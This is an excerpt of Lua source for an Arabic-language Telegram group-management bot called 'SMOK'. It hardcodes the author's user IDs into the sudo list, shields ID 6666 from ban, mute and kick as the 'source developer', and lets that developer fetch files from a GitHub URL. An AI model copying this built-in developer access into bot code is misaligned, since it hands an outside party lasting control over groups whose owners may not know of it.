...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,1753984669,6666}
...
var = true  
elseif tonumber(user_id) == tonumber(6666) then
var = true  
...
if result.id_ == tonumber(6666) then
send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
...
if result.sender_user_id_ == tonumber(6666) then
send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
...
if text == (database:get(bot_id.."SMOK:Name:Bot") or "بلاك") then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
Namebot = (database:get(bot_id.."SMOK:Name:Bot") or "بلاك")
local namebot = {
...
if DevSMOK(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SMOK/files_SMOK/master/getfile.json")
if res == 200 then
...
local Name_Bot = (database:get(bot_id.."SMOK:Name:Bot") or "بلاك")
